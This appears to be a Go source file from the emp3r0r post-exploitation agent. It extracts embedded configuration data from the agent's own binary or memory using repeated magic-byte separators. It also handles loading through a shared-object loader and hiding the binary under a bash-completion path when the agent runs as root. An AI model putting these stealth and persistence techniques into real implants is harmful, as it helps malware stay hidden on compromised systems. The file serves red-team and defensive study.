package util

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"runtime"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

// ExtractData extract embedded data from args[0] or process memory
func ExtractData() (data []byte, err error) {
	data, err = DigEmbeddedDataFromExe()
	if err != nil {
		log.Printf("Extract data from executable: %v", err)
		data, err = DigEmbededDataFromMem()
		if err != nil {
			err = fmt.Errorf("Extract data from memory: %v", err)
			return
		}
		log.Printf("Found %d bytes in memory", len(data))
	} else {
		log.Printf("Found %d bytes in %s", len(data), os.Args[0])
	}

	if len(data) <= 0 {
		err = fmt.Errorf("No data extracted")
	}
	return
}

// GetProcessExe dump executable of target process
func GetProcessExe(pid int) (exe_data []byte, err error) {
	process_exe_file := fmt.Sprintf("/proc/%d/exe", pid)
	if runtime.GOOS == "windows" {
		process_exe_file = os.Args[0]
	}
	// see loader.c
	// if started by loader.so, /proc/self/exe will not be agent binary
	if os.Getenv("LD") == "true" {
		exe_file := FileBaseName(os.Args[0])
		process_exe_file = fmt.Sprintf("%s/_%s",
			ProcCwd(pid),
			exe_file)
		if os.Geteuid() == 0 {
			process_exe_file = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
				exe_file)
		}
	}
	exe_data, err = os.ReadFile(process_exe_file)

	return
}

// DigEmbededDataFromFile search args[0] file content for data embeded between two separators
// separator is MagicString*3
func DigEmbeddedDataFromExe() ([]byte, error) {
	wholeStub, err := GetProcessExe(os.Getpid())
	log.Printf("Read %d bytes from process executable", len(wholeStub))
	if err != nil {
		return nil, err
	}

	return DigEmbeddedData(wholeStub)
}

// DigEmbeddedData search for embedded data in given []byte buffer
func DigEmbeddedData(data []byte) (embedded_data []byte, err error) {
	// extract the last N bytes to use as magic string
	magic_str := data[len(data)-len(emp3r0r_data.OneTimeMagicBytes):]
	log.Printf("Trying magic string %x (%d bytes)", magic_str, len(magic_str))

	sep := bytes.Repeat(magic_str, 3)

	// locate embedded_data
	split := bytes.Split(data, sep)
	if len(split) < 2 {
		err = fmt.Errorf("Cannot locate magic string from %d of given data", len(data))
		return
	}
	embedded_data = split[1]
	if len(embedded_data) <= 0 {
		err = fmt.Errorf("Digged nothing from %d of given data", len(data))
		return
	}

	// now we have the correct magic string
	emp3r0r_data.OneTimeMagicBytes = magic_str
	log.Printf("Now we have magic string %x (%d bytes)",
		emp3r0r_data.OneTimeMagicBytes, len(emp3r0r_data.OneTimeMagicBytes))
	return
}

// DigEmbededDataFromMem search process memory for data embeded between two separators
// separator is MagicString*3
func DigEmbededDataFromMem() (data []byte, err error) {
	mem_regions, err := DumpSelfMem()
	if err != nil {
		err = fmt.Errorf("Cannot dump self memory: %v", err)
		return
	}

	for n, mem_region := range mem_regions {
		data, err = DigEmbeddedData(mem_region)
		if err != nil {
			log.Printf("Nothing in memory region %d (%d bytes): %v", n, len(mem_region), err)
			continue
		}
		break
	}
	if len(data) <= 0 {
		return nil, fmt.Errorf("No data found in memory")
	}

	return
}

// DumpSelfMem dump all mapped memory regions of current process
func DumpSelfMem() ([][]byte, error) {
	return crossPlatformDumpSelfMem()
}
